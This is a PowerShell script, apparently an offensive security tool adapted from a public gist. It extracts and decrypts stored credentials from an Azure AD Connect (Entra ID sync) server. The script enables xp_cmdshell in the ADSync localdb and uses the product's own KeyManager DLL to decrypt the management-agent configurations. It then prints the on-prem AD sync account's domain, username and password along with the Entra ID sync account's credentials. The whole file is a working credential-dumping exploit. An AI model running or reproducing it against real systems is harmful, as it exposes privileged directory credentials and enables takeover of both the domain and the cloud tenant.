# Original script by @_xpn_: https://gist.github.com/xpn/f12b145dba16c2eebdd1c6829267b90c
# Modified by @NeffIsBack:
# - Added support for Entra ID sync credentials (original source: https://github.com/Gerenios/AADInternals-Endpoints/blob/6af2054705e900b733ba76c6e65bfa6cad2328cc/AADSyncSettings.ps1#L108-L116)

# Function to decrypt the encrypted configuration of the Azure AD Connect sync stuff
function decrypter($crypted, $key_id, $instance_id, $entropy) {
    $cmd = $client.CreateCommand()
    $cmd.CommandText = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'powershell.exe -c `"add-type -path ''C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'';`$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager;`$km.LoadKeySet([guid]''$entropy'', [guid]''$instance_id'', $key_id);`$key2 = `$null;`$km.GetKey(1, [ref]`$key2);`$decrypted = `$null;`$key2.DecryptBase64ToString(''$crypted'', [ref]`$decrypted);Write-Host `$decrypted`"'"
    $reader = $cmd.ExecuteReader()

    $decrypted = [string]::Empty

    while ($reader.Read() -eq $true -and $reader.IsDBNull(0) -eq $false) {
        $decrypted += $reader.GetString(0)
    }
    $reader.Close()

    if ($decrypted -eq [string]::Empty) {
        Write-Host "[!] Error using xp_cmdshell to launch our decryption powershell"
        return
    }

    return $decrypted
}

# Create a connection to the localdb instance of Azure AD Connect
$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Data Source=(localdb)\.\ADSync2019;Initial Catalog=ADSync"

try {
    $client.Open()
} catch {
    Write-Host "[!] Could not connect to localdb, Entra ID sync probably not installed"
    return
}

function f {
    param ($q)
    $c = $client.CreateCommand()
    $c.CommandText = $q
    $r = $c.ExecuteReader()
    if (-not $r.Read()) {
        Write-Host "[!] Error querying: $q"
        return
    }
    $res = for ($i = 0; $i -lt $r.FieldCount; $i++) { $r.GetValue($i) }
    $r.Close()
    return $res
}

# Get keyset_id, instance_id, entropy
$out = f "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
if (-not $out) { return }
$key_id, $instance_id, $entropy = $out

# Get and decrypt on-prem AD credentials
$out = f "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
if (-not $out) { return }
$on_prem, $c = $out
$pd = decrypter $c $key_id $instance_id $entropy

# Get and decrypt Entra ID sync credentials
$out = f "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE subtype = 'Windows Azure Active Directory (Microsoft)'"
if (-not $out) { return }
$entra, $c = $out
$qd = decrypter $c $key_id $instance_id $entropy



# Extract the credentials from the decrypted XML configurations
$domain = select-xml -Content $on_prem -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerText}}
$username = select-xml -Content $on_prem -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerText}}
$pw = select-xml -Content $pd -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerText}}

Write-Host "On-prem Domain: $($domain.Domain)"
Write-Host "On-prem Username: $($username.Username)"
Write-Host "On-prem Password: $($pw.Password)"

# Extract the Entra ID sync credentials
$entra_user = ([xml]$entra).MAConfig.'parameter-values'.parameter[0].'#text'
$entra_pw = select-xml -Content $qd -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerText}}
Write-Host "Entra ID Username: $($entra_user)"
Write-Host "Entra ID Password: $($entra_pw.Password)"